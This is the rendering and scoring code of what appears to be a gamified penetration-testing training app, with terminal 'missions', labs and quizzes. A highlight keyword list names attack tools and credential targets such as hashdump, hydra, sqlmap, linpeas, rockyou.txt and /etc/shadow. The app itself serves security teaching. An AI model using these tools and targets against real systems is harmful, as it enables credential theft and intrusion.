    var remaining=weak.filter(function(w){return picked.indexOf(w)===-1});
    localStorage.setItem(sKey(S.user,'weak'),JSON.stringify(remaining));
    return picked;
  }catch(e){return[]}
}

function startLesson(id){S.activeId=id;S.ri=0;S.scores=[];S.missed=[];S.activeRounds=null;S.screen='lesson';render()}

function renderLesson(){
  var level=null;
  for(var i=0;i<ALL_LEVELS.length;i++)if(ALL_LEVELS[i].id===S.activeId){level=ALL_LEVELS[i];break}
  if(!level){S.screen='map';render();return}
  // Build active rounds: original + any recycled missed rounds
  if(!S.activeRounds){
    S.activeRounds=level.rounds.slice();
    // Inject missed questions from past levels (stored in progress)
    var weakQs=getWeakQuestions(S.activeId);
    if(weakQs.length>0){S.activeRounds=S.activeRounds.concat(weakQs)}
  }
  var rounds=S.activeRounds,round=rounds[S.ri];
  if(!round){S.screen='result';render();return}
  var progress=S.ri/rounds.length*100;

  // Fixed progress bar at very top of screen
  var pbar=document.createElement('div');pbar.className='lesson-progress';pbar.style.width=progress+'%';root.appendChild(pbar);

  var w=document.createElement('div');w.className='hp';

  // Lesson header with back, title, count
  var top=document.createElement('div');top.className='lesson-header';
  var xb=document.createElement('button');xb.className='back-btn';xb.textContent='\u2190';xb.setAttribute('aria-label','Leave lesson');xb.onclick=function(){if(S.ri>0){showConfirm('Leave lesson?','Your progress in this lesson will be lost.',function(){S.screen='map';render()})}else{S.screen='map';render()}};
  top.appendChild(xb);
  var ltitle=document.createElement('span');ltitle.className='ltitle';ltitle.textContent=level.title;top.appendChild(ltitle);
  var cnt=document.createElement('span');cnt.className='round-count';cnt.textContent=(S.ri+1)+'/'+rounds.length;
  top.appendChild(cnt);w.appendChild(top);

  function advance(scored){
    if(scored!==undefined){
      S.scores.push(scored);
      // If wrong, recycle this round to the end (but only once)
      if(!scored&&rounds[S.ri]&&!rounds[S.ri]._recycled){
        var retry=JSON.parse(JSON.stringify(rounds[S.ri]));
        retry._recycled=true;
        S.activeRounds.push(retry);
        // Track for future levels
        if(!S.missed)S.missed=[];
        S.missed.push(rounds[S.ri]);
      }
    }
    S.ri++;render();
  }

  // Helper: add feedback + Next button (used by all scored rounds)
  function showFeedback(card,correct,round,advanceFn){
    card.classList.add(correct?'glow':'shake');
    if(round.why){var wh=document.createElement('div');wh.className='why';wh.textContent=round.why;card.appendChild(wh)}
    var nb=document.createElement('button');nb.className='btn full';nb.style.marginTop='8px';nb.textContent='Next \u2192';
    nb.onclick=function(){document.onkeydown=null;advanceFn(correct)};card.appendChild(nb);
    document.onkeydown=function(e){if(e.key==='Enter'){e.preventDefault();document.onkeydown=null;advanceFn(correct)}};
    setTimeout(function(){nb.focus()},100);
  }

  // Helper: add glossary for question text
  function addGloss(card,text){
    var terms=getGlossaryTerms(text);var el=makeGlossaryEl(terms);if(el)card.appendChild(el);
  }

  var card=document.createElement('div');card.className='card slideUp gap';

  // TEACH
  if(round.type==='teach'){
    card.classList.add('teach');
    card.innerHTML='<div style="font-size:.68rem;color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83D\uDCD6 LEARN</div>';
    // Format text: highlight commands in backticks
    var txt=document.createElement('div');txt.style.cssText='font-size:.9rem;line-height:1.65';
    var rawText=round.text;
    // Auto-highlight known commands and paths
    var cmds=['pwd','ls -la','ls -al','ls','cd','cat','grep','find','cp','mv','rm','mkdir','touch','chmod','sudo -l','sudo','whoami','ip addr','ifconfig','ping','nmap','whois','dig','nslookup','subfinder','amass','gobuster','dirsearch','curl','hashcat','hydra','sqlmap','msfconsole','hashdump','sysinfo','getsystem','linpeas','nuclei','httpx','waybackurls','ssh','nmap -sV','nmap -sS','nmap -p-','--script=vuln','-sV','-sS','-sT','-sU','-sn','-sC','-O','-p-','-T3','-T4','-T5','/etc/passwd','/etc/shadow','/tmp','/var/log','~/.bash_history','rockyou.txt','.htpasswd','.env','robots.txt','-m 0','-r','grep -r','find /'];
    cmds.sort(function(a,b){return b.length-a.length});
    // Find and highlight commands
    function highlightText(text){
      var result=document.createDocumentFragment();
      // Simple approach: split by known commands
      var html=text;
      var tokens=[];var last=0;
      // Find all command matches
      var matches=[];
      cmds.forEach(function(cmd){
        var idx=0;
        while(true){
          var pos=html.indexOf(cmd,idx);
          if(pos===-1)break;
          // Check word boundary-ish (not inside another word)
          var before=pos>0?html[pos-1]:' ';
          var after=pos+cmd.length<html.length?html[pos+cmd.length]:' ';
          if(before!==' '&&before!=='.'&&before!==','&&before!=='('&&before!=='\n'&&before!==':'&&before!=='/'&&before!=='-'){idx=pos+1;continue}
          matches.push({pos:pos,len:cmd.length,cmd:cmd});
          idx=pos+cmd.length;
        }
      });
      // Sort by position, remove overlaps
      matches.sort(function(a,b){return a.pos-b.pos});
      var clean=[];var end=0;
      matches.forEach(function(m){if(m.pos>=end){clean.push(m);end=m.pos+m.len}});
      // Build fragments
      var i=0;
      clean.forEach(function(m){
        if(m.pos>i)result.appendChild(document.createTextNode(html.slice(i,m.pos)));
        var sp=document.createElement('span');sp.style.cssText='color:var(--cyan);font-family:JetBrains Mono,monospace;font-weight:600;font-size:.85rem;background:rgba(0,200,255,.08);padding:1px 5px;border-radius:4px';
        sp.textContent=m.cmd;result.appendChild(sp);
        i=m.pos+m.len;
      });
      if(i<html.length)result.appendChild(document.createTextNode(html.slice(i)));
      return result;
    }
    txt.appendChild(highlightText(rawText));card.appendChild(txt);
    // Bonus detail box
    if(round.detail){
      var det=document.createElement('div');det.style.cssText='background:var(--bg2);border-radius:10px;padding:10px 14px;margin-top:8px;border-left:3px solid var(--cyan)';
      var dh=document.createElement('div');dh.style.cssText='font-size:.7rem;color:var(--cyan);font-weight:700;margin-bottom:4px';dh.textContent='\uD83D\uDCA1 BREAKDOWN';det.appendChild(dh);
      var dd=document.createElement('div');dd.style.cssText='font-size:.82rem;line-height:1.6;color:var(--text2);white-space:pre-wrap';dd.appendChild(highlightText(round.detail));det.appendChild(dd);
      card.appendChild(det);
    }
    addGloss(card,round.text);
    if(round.os&&typeof round.os==='object'&&S.userOS){
      var osDiv=document.createElement('div'),activeOS=S.userOS[0];
      function drawOS(){
        osDiv.innerHTML='';
        var tabs=document.createElement('div');tabs.style.cssText='display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap';
        S.userOS.forEach(function(os){
          var tb=document.createElement('button');tb.className='ostab'+(activeOS===os?' active':'');tb.textContent=os;
          tb.onclick=function(){activeOS=os;drawOS()};tabs.appendChild(tb);
        });osDiv.appendChild(tabs);
        var code=document.createElement('div');code.style.cssText='background:var(--bg);padding:12px;border-radius:8px;font-family:JetBrains Mono,monospace;font-size:.78rem;white-space:pre-wrap;color:var(--green);line-height:1.6';
        code.textContent=round.os[activeOS]||round.os.linux||'Same as Linux';osDiv.appendChild(code);
      }
      drawOS();card.appendChild(osDiv);
    }
    var btn=document.createElement('button');btn.className='btn full';btn.textContent='Got it \u2192';btn.onclick=function(){document.onkeydown=null;advance()};card.appendChild(btn);
    document.onkeydown=function(e){if(e.key==='Enter'){e.preventDefault();document.onkeydown=null;advance()}};
  }
  // PICK
  else if(round.type==='pick'){
    var answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    addGloss(card,round.q);
    var od=document.createElement('div');
    shuffle(round.opts).forEach(function(opt){
      var b=document.createElement('button');b.className='opt';b.textContent=opt;
      b.onclick=function(){if(answered)return;answered=true;
        var correct=opt===round.a;correct?SFX.correct():SFX.wrong();
        var bs=od.querySelectorAll('.opt');
        for(var i=0;i<bs.length;i++){if(bs[i].textContent===round.a){bs[i].classList.add('correct');bs[i].classList.add('pulse')}else if(bs[i].textContent===opt&&!correct){bs[i].classList.add('wrong');bs[i].classList.add('shake')}}
        showFeedback(card,correct,round,advance);
      };od.appendChild(b);
    });card.appendChild(od);
  }
  // TF
  else if(round.type==='tf'){
    var answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    addGloss(card,round.q);
    var row=document.createElement('div');row.style.cssText='display:flex;gap:8px';
    [true,false].forEach(function(v){
      var b=document.createElement('button');b.className='opt';b.style.cssText='flex:1;text-align:center;font-weight:600';b.textContent=v?'\u2705 True':'\u274C False';
      b.onclick=function(){if(answered)return;answered=true;
        var correct=v===round.a;correct?SFX.correct():SFX.wrong();
        var bs=row.querySelectorAll('.opt');for(var i=0;i<bs.length;i++){var bv=bs[i].textContent.indexOf('True')!==-1;if(bv===round.a){bs[i].classList.add('correct');bs[i].classList.add('pulse')}else if(bv===v&&!correct){bs[i].classList.add('wrong');bs[i].classList.add('shake')}}
        showFeedback(card,correct,round,advance);
      };row.appendChild(b);
    });card.appendChild(row);
  }
  // TYPE / FILLIN
  else if(round.type==='type'||round.type==='fillin'){
    var answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    addGloss(card,round.q);
    var inp=document.createElement('input');inp.className='inp';inp.placeholder='Type your answer...';inp.autocomplete='off';inp.autocapitalize='off';inp.spellcheck=false;
    var btn=document.createElement('button');btn.className='btn full';btn.textContent='Check';
    function doCheck(){if(answered||!inp.value.trim())return;answered=true;
      var correct=false;for(var i=0;i<round.a.length;i++)if(inp.value.trim().toLowerCase()===round.a[i].toLowerCase()){correct=true;break}
      correct?SFX.correct():SFX.wrong();card.classList.add(correct?'glow':'shake');
      if(!correct){var ans=document.createElement('div');ans.style.cssText='font-size:.82rem;color:var(--green);font-family:JetBrains Mono,monospace;padding:8px 12px;background:var(--bg);border-radius:8px;margin-top:4px';ans.textContent=round.a[0];card.appendChild(ans)}
      btn.style.display='none';inp.disabled=true;
      showFeedback(card,correct,round,advance);
    }
    inp.onkeydown=function(e){if(e.key==='Enter')doCheck()};btn.onclick=doCheck;
    card.appendChild(inp);card.appendChild(btn);w.appendChild(card);root.appendChild(w);setTimeout(function(){inp.focus()},100);return;
  }
  // ORDER
  else if(round.type==='order'){
    var items=shuffle(round.items),answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    var ld=document.createElement('div');
    function drawOrd(){ld.innerHTML='';items.forEach(function(item,i){
      var r=document.createElement('div');r.className='oi';
      r.innerHTML='<span style="color:var(--textDim);font-size:.78rem;width:20px;font-family:JetBrains Mono,monospace">'+(i+1)+'</span><span style="flex:1;font-size:.85rem">'+esc(item)+'</span>';
      var btns=document.createElement('div');btns.style.cssText='display:flex;flex-direction:column;gap:2px';
      var up=document.createElement('button');up.innerHTML='&#9650;';up.onclick=function(){if(answered||i===0)return;SFX.tap();var t=items[i];items[i]=items[i-1];items[i-1]=t;drawOrd()};
      var dn=document.createElement('button');dn.innerHTML='&#9660;';dn.onclick=function(){if(answered||i===items.length-1)return;SFX.tap();var t=items[i];items[i]=items[i+1];items[i+1]=t;drawOrd()};
      btns.appendChild(up);btns.appendChild(dn);r.appendChild(btns);ld.appendChild(r);
    })}
    drawOrd();card.appendChild(ld);
    var btn=document.createElement('button');btn.className='btn full';btn.textContent='Check Order';
    btn.onclick=function(){if(answered)return;answered=true;
      var correct=true;for(var i=0;i<items.length;i++)if(items[i]!==round.items[i]){correct=false;break}
      correct?SFX.correct():SFX.wrong();card.classList.add(correct?'pulse':'shake');
      if(!correct)setTimeout(function(){items=round.items.slice();drawOrd()},600);
      btn.style.display='none';showFeedback(card,correct,round,advance);
    };card.appendChild(btn);
  }
  // MATCH
  else if(round.type==='match'){
    var sel=null,selSide=null,matched={},rMatched={},complete=false;
    var leftItems=round.pairs.map(function(p){return p[0]});
    var rightItems=shuffle(round.pairs.map(function(p){return p[1]}));
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div><div style="font-size:.72rem;color:var(--textDim)">Tap any item, then tap its match</div>';
    var grid=document.createElement('div');grid.style.cssText='display:grid;grid-template-columns:1fr 1fr;gap:8px';
    var lc=document.createElement('div');lc.className='gap';var rc=document.createElement('div');rc.className='gap';
    function tryMatch(a,aSide,b,bSide){
      var left=aSide==='L'?a:b,right=aSide==='L'?b:a;
      var pair=null;for(var i=0;i<round.pairs.length;i++)if(round.pairs[i][0]===left&&round.pairs[i][1]===right)pair=round.pairs[i];
      if(pair){matched[left]=right;rMatched[right]=left;sel=null;selSide=null;SFX.tap();
        var mc=0;for(var k in matched)mc++;
        if(mc===round.pairs.length){complete=true;SFX.correct();showFeedback(card,true,round,advance)}drawM();
      }else{SFX.wrong();sel=null;selSide=null;drawM()}
    }
    function drawM(){lc.innerHTML='';rc.innerHTML='';
      leftItems.forEach(function(item){
        var done=!!matched[item],isSel=sel===item&&selSide==='L';
        var d=document.createElement('div');d.className='mi';
        d.style.borderColor=done?'var(--green)':isSel?'var(--blue)':'var(--border)';
        d.style.background=done?'var(--greenDim)':isSel?'var(--blueDim)':'var(--card2)';d.style.color=done?'var(--green)':'var(--text)';
        d.textContent=(done?'\u2713 ':'')+item;
        if(!done&&!complete)d.onclick=function(){SFX.tap();
          if(sel&&selSide==='R'){tryMatch(sel,'R',item,'L')}
          else if(sel===item&&selSide==='L'){sel=null;selSide=null;drawM()}
          else{sel=item;selSide='L';drawM()}
        };lc.appendChild(d);
      });
      rightItems.forEach(function(item){
        var done=!!rMatched[item],isSel=sel===item&&selSide==='R';
        var d=document.createElement('div');d.className='mi';
        d.style.borderColor=done?'var(--green)':isSel?'var(--blue)':'var(--border)';
        d.style.background=done?'var(--greenDim)':isSel?'var(--blueDim)':'var(--card2)';d.style.color=done?'var(--green)':'var(--text)';
        d.textContent=(done?'\u2713 ':'')+item;
        if(!done&&!complete)d.onclick=function(){SFX.tap();
          if(sel&&selSide==='L'){tryMatch(sel,'L',item,'R')}
          else if(sel===item&&selSide==='R'){sel=null;selSide=null;drawM()}
          else{sel=item;selSide='R';drawM()}
        };rc.appendChild(d);
      });}
    drawM();grid.appendChild(lc);grid.appendChild(rc);card.appendChild(grid);
  }
  // BUILD
  else if(round.type==='build'){
    var built=[],avail=shuffle(round.parts.slice()),answered=false;
    card.innerHTML='<div style="font-weight:600;font-size:.92rem;line-height:1.4">'+esc(round.q)+'</div>';
    var bd=document.createElement('div');bd.style.cssText='min-height:44px;background:var(--bg);border-radius:10px;padding:10px;display:flex;flex-wrap:wrap;gap:6px;font-family:JetBrains Mono,monospace;font-size:.8rem';
    var ad=document.createElement('div');ad.style.cssText='display:flex;flex-wrap:wrap;gap:6px';
    var ck=document.createElement('button');ck.className='btn full';ck.textContent='Check';ck.style.display='none';
    function drawB(){bd.innerHTML='';ad.innerHTML='';
      if(!built.length)bd.innerHTML='<span style="color:var(--textDim)">Tap parts to build...</span>';
      built.forEach(function(p,i){var s=document.createElement('span');s.style.cssText='background:var(--card2);padding:5px 10px;border-radius:6px;cursor:pointer;border:1px solid var(--border)';s.textContent=p;s.onclick=function(){if(answered)return;avail.push(built[i]);built.splice(i,1);drawB()};bd.appendChild(s)});
      avail.forEach(function(p,i){var b=document.createElement('button');b.className='btn sm sec';b.style.cssText='font-family:JetBrains Mono,monospace;font-size:.78rem';b.textContent=p;b.onclick=function(){if(answered)return;SFX.tap();built.push(avail[i]);avail.splice(i,1);drawB()};ad.appendChild(b)});
      ck.style.display=built.length&&!answered?'':'none';
    }
    ck.onclick=function(){if(answered)return;answered=true;
      var correct=built.join(' ')===round.answer.join(' ');correct?SFX.correct():SFX.wrong();card.classList.add(correct?'glow':'shake');
      if(!correct){var ans=document.createElement('div');ans.style.cssText='font-size:.82rem;color:var(--green);font-family:JetBrains Mono,monospace;padding:8px 12px;background:var(--bg);border-radius:8px';ans.textContent=round.answer.join(' ');card.appendChild(ans)}
      ck.style.display='none';showFeedback(card,correct,round,advance);
    };
    drawB();card.appendChild(bd);card.appendChild(ad);card.appendChild(ck);
  }
  // SCENARIO
  else if(round.type==='scenario'){
    var answered=false;
    card.innerHTML='<div style="font-size:.68rem;color:var(--gold);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83C\uDFAD SCENARIO</div>';
    card.innerHTML+='<div style="font-weight:600;font-size:.92rem;line-height:1.4;padding:10px 14px;background:var(--bg2);border-radius:8px;border-left:2px solid var(--gold)">'+esc(round.situation)+'</div>';
    card.innerHTML+='<div style="font-size:.85rem;color:var(--text2)">'+esc(round.q)+'</div>';
    var od=document.createElement('div');
    shuffle(round.opts).forEach(function(opt){
      var b=document.createElement('button');b.className='opt';b.textContent=opt;
      b.onclick=function(){if(answered)return;answered=true;
        var correct=opt===round.a;correct?SFX.correct():SFX.wrong();
        var bs=od.querySelectorAll('.opt');
        for(var i=0;i<bs.length;i++){if(bs[i].textContent===round.a){bs[i].classList.add('correct');bs[i].classList.add('pulse')}else if(bs[i].textContent===opt&&!correct){bs[i].classList.add('wrong');bs[i].classList.add('shake')}}
        showFeedback(card,correct,round,advance);
      };od.appendChild(b);
    });card.appendChild(od);
  }
  // HACK ‚Äî mini terminal mission
  else if(round.type==='hack'){
    var answered=false;
    card.style.borderLeft='3px solid var(--green)';
    card.innerHTML='<div style="font-size:.68rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83D\uDCBB MISSION</div>';
    var story=document.createElement('div');story.style.cssText='font-size:.88rem;line-height:1.5;color:var(--text2);padding:8px 12px;background:var(--bg2);border-radius:8px;margin:4px 0';story.textContent=round.story;card.appendChild(story);
    var prompt=document.createElement('div');prompt.style.cssText='font-size:.85rem;font-weight:600;margin:6px 0 4px';prompt.textContent=round.q;card.appendChild(prompt);
    addGloss(card,round.story+' '+round.q);
    var termWrap=document.createElement('div');termWrap.className='labterm';termWrap.style.maxHeight='80px';termWrap.style.minHeight='40px';
    termWrap.innerHTML='<div class="p">$ <span id="hackCmd" style="opacity:.3">waiting...</span></div>';card.appendChild(termWrap);
    var lr=document.createElement('div');lr.style.cssText='display:flex;gap:6px;align-items:center;margin-top:6px';
    lr.innerHTML='<span style="color:var(--green);font-family:JetBrains Mono,monospace;font-size:.8rem">$</span>';
    var inp=document.createElement('input');inp.className='inp';inp.style.cssText='flex:1;font-size:.8rem;padding:10px 12px';inp.placeholder='Type command...';inp.autocomplete='off';inp.autocapitalize='off';inp.spellcheck=false;
    var btn=document.createElement('button');btn.className='btn sm';btn.textContent='Run';
    function runHack(){if(answered||!inp.value.trim())return;answered=true;
      var cmd=inp.value.trim();
      var correct=false;for(var i=0;i<round.a.length;i++)if(cmd.toLowerCase().replace(/\s+/g,' ')===round.a[i].toLowerCase()){correct=true;break}
      // Partial match: must be at least 60% of the expected command
      if(!correct)for(var i=0;i<round.a.length;i++){var a=round.a[i].toLowerCase(),c=cmd.toLowerCase();if(c.length>=a.length*.6&&(a.indexOf(c)!==-1||c.indexOf(a)!==-1)){correct=true;break}}
      var cmdEl=document.getElementById('hackCmd');if(cmdEl){cmdEl.textContent=cmd;cmdEl.style.opacity='1'}
      termWrap.style.maxHeight='200px';
      if(correct){
        SFX.correct();
        var out=document.createElement('div');out.className='o';out.textContent=round.output;termWrap.appendChild(out);
        var suc=document.createElement('div');suc.className='s';suc.textContent='\u2705 '+round.success;termWrap.appendChild(suc);
        card.classList.add('glow');
      }else{
        SFX.wrong();
        var fail=document.createElement('div');fail.className='f';fail.textContent='bash: '+cmd+': command not recognized in this context';termWrap.appendChild(fail);
        var hint=document.createElement('div');hint.className='h';hint.textContent='\uD83D\uDCA1 Try: '+round.a[0];termWrap.appendChild(hint);
      }
      inp.disabled=true;btn.style.display='none';
      showFeedback(card,correct,round,advance);
      termWrap.scrollTop=termWrap.scrollHeight;
    }
    inp.onkeydown=function(e){if(e.key==='Enter')runHack()};btn.onclick=runHack;
    lr.appendChild(inp);lr.appendChild(btn);card.appendChild(lr);
    if(round.quickCmds){var qr=document.createElement('div');qr.style.cssText='display:flex;flex-wrap:wrap;gap:4px;margin-top:4px';
      round.quickCmds.forEach(function(c){var b=document.createElement('button');b.className='btn sm sec';b.style.cssText='font-family:JetBrains Mono,monospace;font-size:.68rem;padding:3px 7px';b.textContent=c;b.onclick=function(){inp.value=c;inp.focus()};qr.appendChild(b)});card.appendChild(qr)}
    w.appendChild(card);root.appendChild(w);setTimeout(function(){inp.focus()},100);return;
  }
  // LAB
  else if(round.type==='lab'){
    var step=0,labDone=false,steps=round.steps,cur=steps[0],hintsUsed=0;
    card.style.borderColor='#1a3a1a';
    card.innerHTML='<div style="display:flex;justify-content:space-between;align-items:center"><div style="font-size:.68rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83D\uDDA5\uFE0F LAB: '+esc(round.title)+'</div><span class="badge badge-level" id="labstep">1/'+steps.length+'</span></div>';
    card.innerHTML+='<div style="background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:10px 14px;font-size:.85rem"><strong style="color:var(--cyan)">\uD83C\uDFAF</strong> '+esc(round.objective)+'</div>';
    var term=document.createElement('div');term.className='labterm';
    if(round.banner){var bd2=document.createElement('div');bd2.className='o';bd2.textContent=round.banner;term.appendChild(bd2)}
    function addLn(c,t){var d=document.createElement('div');d.className=c;d.textContent=t;term.appendChild(d);term.scrollTop=term.scrollHeight}
    addLn('h','Step 1/'+steps.length+' \u2014 What do you do?');card.appendChild(term);
    var lr=document.createElement('div');lr.style.cssText='display:flex;gap:6px;align-items:center;margin-top:8px';
    lr.innerHTML='<span style="color:var(--green);font-family:JetBrains Mono,monospace;font-size:.8rem">$</span>';
    var li2=document.createElement('input');li2.className='inp';li2.style.cssText='flex:1;font-size:.8rem;padding:10px 12px';li2.placeholder='Type command...';li2.autocomplete='off';li2.autocapitalize='off';li2.spellcheck=false;
    var lb=document.createElement('button');lb.className='btn sm';lb.textContent='Run';
    function runC(){if(labDone||!li2.value.trim())return;var cmd=li2.value.trim();li2.value='';addLn('p','$ '+cmd);cur=steps[step];
      var ok=false;for(var i=0;i<cur.accept.length;i++){var a=cur.accept[i];if(a.charAt(0)==='~'){if(cmd.toLowerCase().indexOf(a.slice(1).toLowerCase())!==-1){ok=true;break}}else if(cmd.toLowerCase().replace(/\s+/g,' ')===a.toLowerCase()){ok=true;break}}
      if(ok){SFX.correct();addLn('o',cur.output);if(cur.successMsg)addLn('s','\u2705 '+cur.successMsg);
        if(step+1>=steps.length){addLn('s','\n\uD83C\uDF89 Lab Complete!');labDone=true;SFX.complete();li2.disabled=true;
          var nb=document.createElement('button');nb.className='btn full';nb.style.marginTop='8px';nb.textContent='Finish Lab \u2192';nb.onclick=function(){advance(true)};card.appendChild(nb);
        }
        else{step++;cur=steps[step];addLn('h','\nStep '+(step+1)+'/'+steps.length+' \u2014 What next?');var ls2=document.getElementById('labstep');if(ls2)ls2.textContent=(step+1)+'/'+steps.length}
      }else{SFX.wrong();addLn('f','Not quite. Try something else.')}
    }
    li2.onkeydown=function(e){if(e.key==='Enter')runC()};lb.onclick=runC;
    lr.appendChild(li2);lr.appendChild(lb);
    var hb=document.createElement('button');hb.className='btn sm sec';hb.textContent='\uD83D\uDCA1 Hint';hb.onclick=function(){cur=steps[step];hintsUsed++;addLn('h','\uD83D\uDCA1 '+cur.hint);if(cur.example)addLn('h','Example: '+cur.example)};
    lr.appendChild(hb);card.appendChild(lr);
  }
  w.appendChild(card);root.appendChild(w);
}
function renderResult(){
  var level=null;for(var i=0;i<ALL_LEVELS.length;i++)if(ALL_LEVELS[i].id===S.activeId){level=ALL_LEVELS[i];break}
  if(!level){S.screen='map';render();return}
  // Score based on original rounds only (not recycled ones)
  var origRounds=level.rounds.filter(function(r){return r.type!=='teach'});
  var correct=0;for(var si=0;si<origRounds.length&&si<S.scores.length;si++){if(S.scores[si])correct++}
  var total=origRounds.length,pctC=total>0?correct/total:1;
  // Masters levels require 100%, all others require 80%
  var isMasters=level.isMasters||false;
  var passThreshold=isMasters?1.0:0.8;
  var passed=pctC>=passThreshold,stars=pctC>=.95?3:pctC>=.85?2:1;
  if(passed)SFX.levelup();
  var w=document.createElement('div');w.className='hp';w.style.cssText='display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;min-height:100dvh;padding:20px';
  var card=document.createElement('div');card.className='card fadeIn gap';card.style.cssText='text-align:center;width:100%';
  var displayName=(S.user&&S.user!=='guest')?esc(S.user):'';
  card.innerHTML='<div style="font-size:1.8rem;font-weight:800;margin-top:12px">'+(passed?'\uD83C\uDF89 Level Complete!':'\uD83D\uDCAA Almost \u2014 try again!')+'</div>';
  card.innerHTML+='<div style="color:var(--text2);font-size:1rem;margin-top:4px">'+correct+'/'+total+' correct'+(total===0?' (info only)':'')+'</div>';
  if(passed&&total>0){
    var starMsg=stars===3?'Perfect run':stars===2?'Great job':'Passed';
    if(displayName)starMsg+=', '+displayName+'!'; else starMsg+='!';
    var sr=document.createElement('div');sr.style.cssText='display:flex;gap:12px;justify-content:center;margin:12px 0';
    for(var s=1;s<=3;s++){var sp=document.createElement('span');sp.style.cssText='font-size:2.5rem;animation-delay:'+s*.15+'s;opacity:'+(s<=stars?1:.15);if(s<=stars)sp.className='starPop';sp.textContent='\u2B50';sr.appendChild(sp)}
    card.appendChild(sr);
    var sm=document.createElement('div');sm.style.cssText='font-size:.95rem;color:var(--text2);font-weight:600;margin-bottom:4px';sm.textContent=starMsg;card.appendChild(sm);
  }
  if(passed){var xpd=document.createElement('div');xpd.style.cssText='font-size:1.1rem;color:var(--green);font-weight:700;margin:8px 0';xpd.textContent='+'+Math.max(correct*10,10)+' XP';card.appendChild(xpd);
    // XP toast
    var toast=document.createElement('div');toast.className='xp-toast';toast.textContent='+'+Math.max(correct*10,10)+' XP';document.body.appendChild(toast);setTimeout(function(){if(toast.parentNode)toast.parentNode.removeChild(toast)},2000);
  }
  else{var nd=document.createElement('div');nd.style.cssText='font-size:.9rem;color:var(--textDim);margin:8px 0';nd.textContent='Need '+(isMasters?'100':'80')+'% to pass';card.appendChild(nd)}
  if(level.title){var lt=document.createElement('div');lt.style.cssText='font-size:.8rem;color:var(--textDim);margin-bottom:8px';lt.textContent=level.title;card.appendChild(lt)}
  var btn=document.createElement('button');btn.className='btn full';btn.style.cssText='padding:14px;font-size:1rem;margin-top:4px';btn.textContent=passed?'Continue':'Retry';
  btn.onclick=function(){if(passed){var old=S.progress[S.activeId]||{};S.progress[S.activeId]={passed:true,stars:Math.max(stars,old.stars||0),xp:Math.max(correct*10,old.xp||0)};saveP(S.user,S.progress)}if(S.missed&&S.missed.length)saveWeak(S.user,S.missed);S.screen='map';render()};
  card.appendChild(btn);
  document.onkeydown=function(e){if(e.key==='Enter'){e.preventDefault();document.onkeydown=null;btn.click()}};
  if(passed){var again=document.createElement('button');again.className='btn sec full';again.style.padding='12px';again.textContent='Practice Again';again.onclick=function(){startLesson(S.activeId)};card.appendChild(again)}
  if(passed&&S.user==='guest'){var gn=document.createElement('div');gn.style.cssText='font-size:.78rem;color:var(--gold);text-align:center;margin-top:10px';gn.textContent='\u26A0\uFE0F This progress won\u2019t be saved \u2014 create an account in Settings';card.appendChild(gn)}
  w.appendChild(card);root.appendChild(w);
}

// === BOOT ===
render();
</script>
</body>
</html>
